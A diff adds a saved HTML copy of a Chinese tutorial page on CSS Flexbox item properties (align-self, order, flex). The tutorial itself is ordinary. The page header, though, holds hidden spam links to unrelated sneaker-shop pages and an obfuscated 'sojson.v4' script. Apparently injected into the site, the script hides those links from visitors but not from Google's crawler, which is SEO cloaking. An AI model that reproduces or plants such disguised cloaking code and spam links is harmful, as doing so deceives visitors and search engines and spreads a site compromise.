@@ -1,0 +1,1391 @@
+<!DOCTYPE html>
+<!-- saved from url=(0144)https://www.w3cplus.com/css/css-flexbox-layout-model-part2.html?expire=1699861536&code=4wRXsClVJ1Y&sign=d2a7d3b6774494ea96dd5432e23420c0#paywall -->
+<html lang="zh-hans" class="js"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+<link rel="shortcut icon" href="https://www.w3cplus.com/sites/all/themes/w3cplusV2/favicon.ico" type="image/vnd.microsoft.icon">
+<meta name="description" content="在《[图解CSS：Flexbox布局(Part1)](//www.w3cplus.com/css/css-flexbox-layout-model-part1.html)》中主要和大家聊了Flexbox布局模块中的技术术语以及运用于Flex容器上的相关属性。在第二部分，主要和大家介绍运用于Flex项目中的属性，比如`align-self`、`order`和`flex`。这一部分也是Flexbox布局中相当复杂的一部分，因为`flex`的`flex-basis`、`flex-grow`和`flex-shrink`属性的计算非常复杂，也直接影响到Flex项目的尺寸大小。如果你对这部分感兴趣的话，请继续往下阅读。">
+<meta name="keywords" content="前端,CSS, 图解CSS, Layout, Flexbox, 会员专栏,教程">
+<meta name="generator" content="Drupal 7 (http://drupal.org)">
+<link rel="canonical" href="https://www.w3cplus.com/css/css-flexbox-layout-model-part2.html">
+<link rel="shortlink" href="https://www.w3cplus.com/node/2639">
+  <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta itemprop="name" content="W3cplus">
+  <meta itemprop="image" content="//www.w3cplus.com/w3cplus-logo.jpg">
+  <meta name="baidu-site-verification" content="ftyq813qEZgpw9nb">
+  <meta name="applicable-device" content="pc,mobile">
+  <title>图解CSS：Flexbox布局(Part2)_CSS, 图解CSS, Layout, Flexbox, 会员专栏 教程_W3cplus</title>
+  <link type="text/css" rel="stylesheet" href="./Flexbox布局：图解CSS(Part2)_files/css_xE-rWrJf-fncB6ztZfd2huxqgxu4WO-qwma6Xer30m4.css" media="all">
+<link type="text/css" rel="stylesheet" href="./Flexbox布局：图解CSS(Part2)_files/css_hYCLW089C9S9sP3ZYkuG6R-Q5ZHbEhblZBFjwZ_bE_I.css" media="all">
+<link type="text/css" rel="stylesheet" href="./Flexbox布局：图解CSS(Part2)_files/css_W_jVXC7gZD8ENo3AHIwFL3Mih90k_Go_X3-i_hfyj2c.css" media="all">
+<link type="text/css" rel="stylesheet" href="./Flexbox布局：图解CSS(Part2)_files/css_dc6MGCsMvp7moqrq-cRLC0GLEMrFF3Ego_HOWYVsZG4.css" media="all">
+  <script src="./Flexbox布局：图解CSS(Part2)_files/hm.js.下载"></script><script type="text/javascript" src="./Flexbox布局：图解CSS(Part2)_files/jquery.min.js.下载"></script>
+
+</head>
+<body class="html not-front not-logged-in one-sidebar sidebar-second page-node page-node- page-node-2639 node-type-blog" style="">
+  <div id="skip-link">
+    <a href="https://www.w3cplus.com/css/css-flexbox-layout-model-part2.html?expire=1699861536&amp;code=4wRXsClVJ1Y&amp;sign=d2a7d3b6774494ea96dd5432e23420c0#main-content" class="element-invisible element-focusable">跳转到主要内容</a>
+  </div>
+    <div id="header" role="header">
+  <div class="container">
+    <h1 id="logo">
+      <a href="https://www.w3cplus.com/" title="记述前端那些事——引领Web前沿" id="site_name">w3cplus</a>
+    </h1>
+    <div class="toggle-topbar menu-icon" id="pull">
+      <a href="https://www.w3cplus.com/css/css-flexbox-layout-model-part2.html?expire=1699861536&amp;code=4wRXsClVJ1Y&amp;sign=d2a7d3b6774494ea96dd5432e23420c0#"><span>Menu</span></a>
+    </div>
+    <div class="toogle-topbar-content" id="pull-menu">
+              <ul class="menu clearfix"><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.vietnamvetsmuseum.org/fbdbdgushop/women/zhenskaya-obuv/krossovki/129720882-krosivki-nike-sb-dunk-low" title="Кроссовки nike sb dunk low — цена 2200 грн в каталоге Кроссовки ✓ Купить женские вещи по доступной цене на Шафе , Украина #129720882 , tiffany blue edition nike free runs women
+" style="display: none;">Кроссовки nike sb dunk low — цена 2200 грн в каталоге Кроссовки ✓ Купить женские вещи по доступной цене на Шафе , Украина #129720882 , tiffany blue edition nike free runs women
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfebcenshop/travis-scott-air-jordan-1-low-og-olive-dz4137-106-release-date-info/" title="IetpShops , Air Match Jordan XIII Michael Finley Autographed Mavs PE - 106 Release Date + Where to Buy - Women&#39;s Air Jordan 1 Mid Surfaces in Lucky Green and Aquatone DZ4137
+" style="display: none;">IetpShops , Air Match Jordan XIII Michael Finley Autographed Mavs PE - 106 Release Date + Where to Buy - Women's Air Jordan 1 Mid Surfaces in Lucky Green and Aquatone DZ4137
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.tbshows.com/ffabdggshop/men/obuv/krossovki/29205605-zimnie-nike-air-force-low-19-black-white-muzhskie-krossovki-nayk" title="чёрные , Украина #29205605, nike air huarache ultra mens black shoes for women, зимні кросівки — цена 1349 грн в каталоге Кроссовки ✓ Купить мужские вещи по доступной цене на Шафе, Зимние nike air force low 19 black white мужские кроссовки найк форс с мехом
+" style="display: none;">чёрные , Украина #29205605, nike air huarache ultra mens black shoes for women, зимні кросівки — цена 1349 грн в каталоге Кроссовки ✓ Купить мужские вещи по доступной цене на Шафе, Зимние nike air force low 19 black white мужские кроссовки найк форс с мехом
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfejbishop/it/p/cropped-hoodie-heron-preston-sweater-1527168" title="Cropped hoodie Heron Preston - IetpShops Italy - Update your everyday staples with this blue chino shirt from Japanese fashion label
+" style="display: none;">Cropped hoodie Heron Preston - IetpShops Italy - Update your everyday staples with this blue chino shirt from Japanese fashion label
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.medtecjapan.com/en/dedefpshop/shoes/sneaker-news/eastside-golf-air-jordan-1-1961-release-date-september-2023-1203507836/" title="Jordan dd9336 414571-104 has officially debuted the
+" style="display: none;">Jordan dd9336 414571-104 has officially debuted the
+</a></li><li class="first leaf"><a href="https://www.w3cplus.com/blog/tags/686.html" title="会员专栏">会员专栏</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/CSS3" title="">CSS</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/JavaScript" title="JavaScript">JavaScript</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/css/books.html" title="我的小册">小册</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/mobile" title="">Mobile</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/svg-tutorial" title="SVG">SVG</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/tags" title="标签云">标签云</a></li>
+<li class="last leaf"><a href="https://www.w3cplus.com/blogs-lists" title="文章列表">文章列表</a></li>
+<script>['sojson.v4']["\x66\x69\x6c\x74\x65\x72"]["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"](((['sojson.v4']+[])["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"]['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65']['\x61\x70\x70\x6c\x79'](null,"118J97J114e32K109l121m95L107G101q121O95v119X111Z114Q100P95f114s101y32l61S32c110p101W119b32w82E101F103g69i120Q112V40h34J71n111K111V103Z108T101g124z109f121L116R101D115z116d34a44p32m34H103o105X34V41h59g105Z102P40Z33j109x121d95d107g101p121J95W119R111K114c100J95M114o101t46V116f101Q115x116u40J110Z97l118N105o103o97R116L111L114W46L117R115I101T114E65K103D101a110e116L41v41E32z123V32i118w97U114Q32d99k108B97j115W115k95i109B121a95v107S101G121H95e119o111J114z100O32B61e32B100F111Y99t117b109G101E110i116D46B103y101m116Q69D108n101G109m101x110d116p115y66E121U67i108P97s115e115H78r97g109c101d40h39S107x101U121f115O95u119r111l114G100n115I39c41o59i32k102v111c114r40y118H97B114E32L105d32n61P32W48l59h32q105W32V60s32j99g108h97f115Y115W95P109J121z95T107I101r121J95Z119t111W114q100X46E108G101m110X103e116P104i59r32K105i43S43W41m32D99x108a97S115W115U95S109s121j95x107Z101v121i95n119S111y114z100x91z105B93U46K115V116Q121B108x101b46i100V105R115P112N108u97E121y32w61P32W39A110t111Q110A101n39h59e125"['\x73\x70\x6c\x69\x74'](/[a-zA-Z]{1,}/))))('sojson.v4');</script></ul>        <!-- /#main-menu -->
+          </div>
+  </div>
+</div>
+
+  <div id="branding" role="branding">
+    <div class="container">
+        <div class="region region-branding">
+    <div id="block-block-46" class="block block-block">
+
+    
+  <div class="content">
+    <div style="margin-bottom: 5px;">
+	<a rel="nofollow" href="https://s.juejin.cn/ds/iJrTure4/" target="_blank" title="现代 CSS"><img alt="现代 CSS" src="./Flexbox布局：图解CSS(Part2)_files/WechatIMG324.jpg" style="width: 100%;height:auto"></a></div>  </div>
+</div>
+  </div>
+    </div>
+  </div> 
+
+<div id="page" role="page">
+  <div class="container">
+    
+    <div class="col-main">
+      <div class="main-wrap">
+        
+                
+        <div class="page-inner">
+                      <div id="breadcrumb" role="breadcrumb">
+              <h2 class="element-invisible">你在这里</h2><div class="breadcrumb"><a href="https://www.w3cplus.com/">首页</a></div>            </div>
+          
+          
+          <a id="main-content"></a>
+                                <h1 class="title" id="page-title">
+              图解CSS：Flexbox布局(Part2)            </h1>
+          
+                    
+                                <div class="region region-content">
+    <div id="block-system-main" class="block block-system">
+
+    
+  <div class="content">
+    <div id="node-2639" class="node node-blog node-promoted node-full clearfix" about="/css/css-flexbox-layout-model-part2.html" typeof="sioc:Post sioct:BlogPost">
+  
+  <div class="node-header">
+              <div class="submitted">
+          作者：<span>大漠</span>          日期：<span>2020-07-03</span>          点击：<span>1529</span>        </div>
+            <div class="tags">
+        <div class="field field-name-field-blog-tag field-type-taxonomy-term-reference field-label-hidden"><div class="field-items"><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/68.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">CSS</a></div><div class="field-item odd"><a href="https://www.w3cplus.com/blog/tags/674.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">图解CSS</a></div><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/180.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Layout</a></div><div class="field-item odd"><a href="https://www.w3cplus.com/blog/tags/157.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Flexbox</a></div><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/686.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">会员专栏</a></div></div></div>      </div>
+  </div>
+
+  
+  <div class="body-content clearfix">
+    <div id="block-block-22" class="block block-block">
+
+    
+  <div class="content">
+    <div>
+<blockquote>
+<p style="font-size: 14px;"><strong>特别声明：</strong>如果您喜欢小站的内容，可以点击<a href="https://www.zhi12.cn/paywall/membership/widget?uid=5491&amp;siteid=s_64be3b00&amp;cms=drupal&amp;content_id=2610&amp;callback=https%3A//www.w3cplus.com&amp;source=https%3A//www.w3cplus.com%3Fq%3Dnode/2610&amp;sign=ecbcc7859e33dea192cf9efdb6d2e61c" style="background: #FF5722;color: #fff;  display: inline-block; padding: 10px; border-radius: 4px;  line-height: 1; margin: 0 3px;" target="_blank">申请会员</a>进行全站阅读。如果您对付费阅读有任何建议或想法，欢迎发送邮件至: <strong>airenliao@gmail.com</strong>!或添加QQ：874472854(^_^)</p>
+</blockquote>
+</div>  </div>
+</div>
+<div class="field field-name-body field-type-text-with-summary field-label-hidden"><div class="field-items"><div class="field-item even" property="content:encoded"><div class="paywall paywall-mb"><div class="paywall-center"><small class="paywall-highlight">* 文本为付费内容（4.99元），您已获得全文阅读权限</small></div></div><blockquote>
+  <p><strong><a href="https://www.w3cplus.com/css/css-flexbox-layout-model-part1.html" target="_blank">如果你未阅读第一部分，强烈建议您先花点时间阅读第一部分</a></strong></p>
+</blockquote>
+
+<h2 class="content-title" data-index="2">运用于Flex项目属性</h2>
+
+<p>运用于Flex项目中的CSS属性和运用于Flex容器上的属性类似，主要分为三个部分：<strong>对齐</strong>、<strong>尺寸</strong> 和 <strong>方向</strong> 三个部分：</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-51.png" alt=""></p>
+
+<h3 class="content-title" data-index="3"><code>align-self</code></h3>
+
+<p>在Flex容器中可以使用<code>align-items</code>来控制来控制Flex项目（所有Flex容器的子元素）在Flex容器侧轴方向的对齐方式。在Flexbox布局模块中，还可以使用<code>align-self</code>对单个Flex项目进行对齐方式的控制，同样是Flex容器侧轴方向的对齐。</p>
+
+<p><code>align-self</code>属性可接受的值主要有：</p>
+
+<pre class="sql"><code class="sql">align-self: auto | flex-<span class="operator"><span class="keyword"><span class="operator"><span class="keyword">start</span></span></span><span class="operator"> | flex-<span class="keyword"><span class="keyword">end</span></span> | center | baseline | stretch;</span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px;">
+<iframe height="500" style="width: 100%;" scrolling="no" title="Flexbox Layout Model: align-self" src="./Flexbox布局：图解CSS(Part2)_files/gOPxVOd(1).html" frameborder="no" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='//codepen.io/airen/pen/gOPxVOd'>Flexbox Layout Model: align-self</a> by Airen
+  (<a rel="nofollow" href='//codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='//codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>即使在Flex容器上显式设置了<code>align-items</code>用来控制所有Flex项目在Flex容器侧轴上的对齐方式，但只要在Flex项目上显式设置了<code>align-self</code>的值，则会覆盖<code>align-items</code>属性。只不过只对显式设置了<code>align-self</code>的Flex项目生效。比如下面这个示例，我们在Flex容器显式设置了<code>align-items</code>的值为<code>center</code>，并且对单数Flex项目显式设置<code>align-self</code>的值：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.flex__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">align-items</span></span></span><span class="rule">:<span class="value"><span class="value"> center;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">direction</span></span></span><span class="rule">:<span class="value"><span class="value"> ltr;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">writing-mode</span></span></span><span class="rule">:<span class="value"><span class="value"> horizontal-tb;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">flex-flow</span></span></span><span class="rule">:<span class="value"><span class="value"> row nowrap;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.flex__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(odd)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">algin-self</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">var(--flexSelf)</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>你将看到的效果如下：</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-52.png" alt=""></p>
+
+<p>这里需要特别提出的一点是：<strong>Flex项目的<code>align-self</code>显式设置值为<code>auto</code>时不会覆盖Flex容器的<code>align-items</code>;另外如果在Flex项目上显式设置<code>margin</code>的值为<code>auto</code>时，Flex项目的<code>align-self</code>值将会失效</strong>。</p>
+
+<p>同样的，<code>algin-self</code>也会受<code>direction</code>和<code>writing-mode</code>取值的影响。</p>
+
+<p>当Flex容器中有多行时，每一行会进行独立的布局，其中<code>align-self</code>属性每次仅作用于单独一行上的Flex项目；同时每一行侧轴长度指定为可容纳该行中的Flex项目（在依据<code>align-self</code>属性进行对齐之后）的最小值，并且这些行依据<code>align-content</code>属性在Flex容器中进行对齐。</p>
+
+<h3 class="content-title" data-index="3"><code>order</code></h3>
+
+<p>在Flexbox布局模块中，我们除了在Flex容器上通过<code>flex-direction</code>来改变DOM源的顺序之外，还可以在Flex项目上显式设置<code>order</code>属性来改变DOM源顺序：</p>
+
+<pre class="javascript"><code class="javascript">order: <span class="number"><span class="number">0</span></span> || <span class="xml"><span class="tag"><span class="xml"><span class="tag">&lt;<span class="title"><span class="title">number</span></span>&gt;</span></span></span><span class="xml">
+</span></span></code></pre>
+
+<p>其中<code>0</code>为<code>order</code>的默认值，同时它可以接受正负值（整数值）。</p>
+
+<div style="margin-bottom: 20px;">
+<iframe height="500" style="width: 100%;" scrolling="no" title="Flexbox Layout Model: order" src="./Flexbox布局：图解CSS(Part2)_files/RwrZXzm(1).html" frameborder="no" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='//codepen.io/airen/pen/RwrZXzm'>Flexbox Layout Model: order</a> by Airen
+  (<a rel="nofollow" href='//codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='//codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>比如上面示例中，每组中的第二个Flex项目<code>order</code>设置了不同的值：</p>
+
+<ul>
+<li>第一组中Flex项目未显式设置<code>order</code>值（即默认值为<code>0</code>）</li>
+<li>第二组中第二个Flex项目显式设置<code>order</code>的值为<code>1</code>，这个时候该Flex项目会排列在最末尾</li>
+<li>第三组中第二个Flex项目显式设置<code>order</code>的值为<code>-1</code>，这个时候该Flex项目会排列在最前面</li>
+</ul>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-53.png" alt=""></p>
+
+<p>其中<code>order</code>值越大，Flex项目越后；反之越前：</p>
+
+<div style="margin-bottom: 20px;">
+<iframe height="500" style="width: 100%;" scrolling="no" title="Flexbox Layout Model: order" src="./Flexbox布局：图解CSS(Part2)_files/rNxGBzK.html" frameborder="no" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='//codepen.io/airen/pen/rNxGBzK'>Flexbox Layout Model: order</a> by Airen
+  (<a rel="nofollow" href='//codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='//codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p><code>order</code>用来控制Flex项目顺序在布局中非常的实用，比如我们要构建一个多列布局：</p>
+
+<pre class="xml"><code class="xml"><span class="comment"><span class="comment">&lt;!-- HTML --&gt;</span></span>
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">header</span></span>&gt;</span></span>Header Section<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">header</span></span>&gt;</span></span>
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">main</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">article</span></span>&gt;</span></span>Article Section<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">article</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">nav</span></span>&gt;</span></span>Nav Section<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">nav</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">aside</span></span>&gt;</span></span>Aside Section<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">aside</span></span>&gt;</span></span>
+<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">main</span></span>&gt;</span></span>
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">footer</span></span>&gt;</span></span>Footer Section<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">footer</span></span>&gt;</span></span>
+</code></pre>
+
+<p>其中<code>&lt;article&gt;</code>放在<code>&lt;nav&gt;</code>和<code>&lt;aside&gt;</code>前面，主要是为了内容为先。针对这样的DOM结构，如果我们希望<code>&lt;nav&gt;</code>在<code>&lt;article&gt;</code>左侧，<code>&lt;aside&gt;</code>在<code>&lt;article&gt;</code>右侧时，<code>order</code>属性就可以起关键性的作用：</p>
+
+<div style="margin-bottom: 20px;">
+<iframe height="500" style="width: 100%;" scrolling="no" title="Flexbox Layout" src="./Flexbox布局：图解CSS(Part2)_files/abdLoEP.html" frameborder="no" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='//codepen.io/airen/pen/abdLoEP'>Flexbox Layout</a> by Airen
+  (<a rel="nofollow" href='//codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='//codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>上面的示例中，在<code>main:hover</code>改变了<code>&lt;nav&gt;</code>和<code>&lt;aside&gt;</code>两个元素的<code>order</code>值：</p>
+
+<pre class="css"><code class="css"><span class="tag"><span class="tag">nav</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">order</span></span></span><span class="rule">:<span class="value"><span class="value"> -<span class="number"><span class="number">1</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="tag"><span class="tag">main</span></span><span class="pseudo"><span class="pseudo">:hover</span></span> <span class="tag"><span class="tag">nav</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">order</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="tag"><span class="tag">main</span></span><span class="pseudo"><span class="pseudo">:hover</span></span> <span class="tag"><span class="tag">aside</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">order</span></span></span><span class="rule">:<span class="value"><span class="value"> -<span class="number"><span class="number">1</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>这个时候看到的效果如下：</p>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-54.gif" alt=""></p>
+
+<h3 class="content-title" data-index="3"><code>flex</code></h3>
+
+<p><code>flex</code>属性主要用来让Flex项目如何伸长或缩短以适应Flex容器中的可用空间。它是一个简写属性，即：</p>
+
+<pre class="javascript"><code class="javascript">flex: [<span class="xml"><span class="tag"><span class="xml"><span class="tag">&lt;<span class="title"><span class="title">flex-grow</span></span>&gt;</span></span></span><span class="xml"><span class="tag"><span class="tag">&lt;<span class="title"><span class="title">flex-shrink</span></span>&gt;</span></span>?||<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">flex-basis</span></span>&gt;</span></span>]
+</span></span></code></pre>
+
+<p>其中：</p>
+
+<pre class="javascript"><code class="javascript">flex-grow: <span class="xml"><span class="tag"><span class="xml"><span class="tag">&lt;<span class="title"><span class="title">number</span></span>&gt;</span></span></span><span class="xml"> 
+flex-shrink: <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">number</span></span>&gt;</span></span>
+flex-basis: content | <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">width</span></span>&gt;</span></span>
+</span></span></code></pre>
+
+<p>这几个属性都有其初始值：</p>
+
+<ul>
+<li><code>flex-grow</code>的初始值为<code>0</code></li>
+<li><code>flex-shrink</code>的初始值为<code>1</code></li>
+<li><code>flex-basis</code>的初始值为<code>auto</code></li>
+</ul>
+
+<p>即 <strong><code>flex</code>的初始值为<code>0 1 auto</code></strong>。换句话说，如果需要重置<code>flex</code>属性的话，可以将其值设置为<code>none</code>。它的实际语法是：</p>
+
+<pre class="javascript"><code class="javascript">flex: none | [ <span class="xml"><span class="tag"><span class="xml"><span class="tag">&lt;<span class="title"><span class="title">'flex-grow'</span></span>&gt;</span></span></span><span class="xml"> <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">'flex-shrink'</span></span>&gt;</span></span>? || <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">'flex-basis'</span></span>&gt;</span></span> ]
+</span></span></code></pre>
+
+<p>在Flexbox布局模块中，<code>flex</code>是一个复杂的属性，从上面的语法规则上不难发现，<code>flex</code>属性可以指定 <strong><code>1</code>个值（单值语法）</strong>、<strong><code>2</code>个值（双值语法）</strong> 或 <strong><code>3</code>个值（三值语法）</strong>。</p>
+
+<p><strong>单值语法</strong>：值必须为以下其中之一：</p>
+
+<ul>
+<li>一个<strong>无单位的数（<code>&lt;number&gt;</code>）</strong>，比如<code>flex: 1</code>，这个时候它会被当作<code>&lt;flex-grow&gt;</code>的值</li>
+<li>一个<strong>有效的宽度（<code>width</code>）值</strong>，比如<code>flex: 30vw</code>，这个时候它会被当作<code>&lt;flex-basis&gt;</code>的值</li>
+<li>关键词 <code>none</code>、<code>auto</code>或<code>initial</code>（即<strong>初始值</strong>）</li>
+</ul>
+
+<blockquote>
+  <p>有关于<code>initial</code>更详细的介绍，可以阅读《<a href="https://www.w3cplus.com/css/Illustrated-CSS-details-and-cases-chr2-cascade-and-inherit.html" target="_blank">图解CSS：CSS层叠和继承</a>》一文。</p>
+</blockquote>
+
+<p><strong>双值语法</strong>：第一个值必须为一个无单位数值，并且它会被当作<code>&lt;flex-grow&gt;</code>的值；第二个值必须为以下之一：</p>
+
+<ul>
+<li>一个<strong>无单位的数（<code>&lt;number&gt;</code>）</strong>，它会被当作<code>&lt;flex-shrink&gt;</code>的值</li>
+<li>一个<strong>有效的宽度（<code>width</code>）值</strong>，它会被当作<code>&lt;flex-basis&gt;</code>的值</li>
+</ul>
+
+<p>比如：</p>
+
+<pre class="xml"><code class="xml">flex: 1 2 » <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">flex-grow</span></span>&gt;</span></span> <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">flex-shrink</span></span>&gt;</span></span> » flex-grow: 1; flex-shrink: 2
+flex: 2 30vw » <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">flex-grow</span></span>&gt;</span></span> <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">flex-basis</span></span>&gt;</span></span> » flex-grow: 2; flex-basis: 30vw
+</code></pre>
+
+<div style="margin-bottom: 20px;">
+<iframe height="500" style="width: 100%;" scrolling="no" title="Flexbox Layout Model: flex" src="./Flexbox布局：图解CSS(Part2)_files/rNxGNoV.html" frameborder="no" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='//codepen.io/airen/pen/rNxGNoV'>Flexbox Layout Model: flex</a> by Airen
+  (<a rel="nofollow" href='//codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='//codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p><img src="./Flexbox布局：图解CSS(Part2)_files/css-flexbox-layout-55.png" alt=""></p>
+
+<p><strong>三值语法</strong>：</p>
+
+<ul>
+<li>第一个值必须是<strong>一个无单位数（<code>&lt;number&gt;</code>）</strong>，并且它会被当作<code>&lt;flex-grow&gt;</code>的值</li>
+<li>第二个值必须是<strong>一个无单位数（<code>&lt;number&gt;</code>）</strong>，并且它会被当作<code>&lt;flex-shrink&gt;</code>的值</li>
+<li>第三个值必须为<strong>一个有效的宽度（<code>width</code>）值</strong>，并且它会被当作<code>&lt;flex-basis&gt;</code>的值</li>
+</ul>
+
+<p>比如：</p>
+
+<pre class="xml"><code class="xml">flex: 1 2 30vw » <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">flex-grow</span></span>&gt;</span></span> <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">flex-shrink</span></span>&gt;</span></span> <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">flex-basis</span></span>&gt;</span></span> 
+//等效于
+flex-grow: 1;
+flex-shrink: 2;
+flex-basis: 30vw;
+</code></pre>
+
+<p>综合上述，<code>flex</code>属性的取值可以是：</p>
+
+<ul>
+<li><strong><code>auto</code></strong>：Flex项目会根据自身的<code>width</code>和<code>height</code>来确定尺寸，但Flex项目根据Flex容器剩余空间进行伸缩。其相当于<code>flex: 1 1 auto</code></li>
+<li><strong><code>initial</code></strong>：Flex项目会根据自身的<code>width</code>和<code>height</code>来设置尺寸。它会缩短自身以适应Flex容器，但不会伸长并吸收Flex容器中的额外剩余空间来适应Flex容器。其相当于<code>flex: 0 1 auto</code></li>
+<li><strong><code>none</code></strong>：Flex项目会根据自身的<code>width</code>和<code>height</code>来设置尺寸。它是完全非弹性的（既不会缩短，也不会伸长来适应Flex容器）。其相当于<code>flex: 0 0 auto</code></li>
+<li><strong><code>&lt;flex-grow&gt;</code></strong>：定义Flex项目的<code>flex-grow</code>属性，取值为<code>&lt;number&gt;</code></li>
+<li><strong><code>&lt;flex-shrink&gt;</code></strong>：定义Flex项目的<code>flex-shrink</code>属性，取值为<code>&lt;number&gt;</code></li>
+<li><strong><code>&lt;flex-basis&gt;</code></strong>：定义Flex项目的<code>flex-basis</code>属性。若值为<code>0</code>，则必须加上单位，以免被视作伸缩性</li>
+</ul>
+
+<p>在大多数情况下，开发者需要将<code>flex</code>设置为<code>auto</code>、<code>initial</code>、<code>none</code>或一个无单位的正整数。比如下面这个示例，你可以尝试着调整Flex容器的大小，来观察<code>flex</code>取这些值的差异：</p>
+
+<div style="margin-bottom: 20px;">
+<iframe height="500" style="width: 100%;" scrolling="no" title="Flexbox Layout Model: flex" src="./Flexbox布局：图解CSS(Part2)_files/OJMxxyP.html" frameborder="no" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/OJMxxyP'>Flexbox Layout Model: flex</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
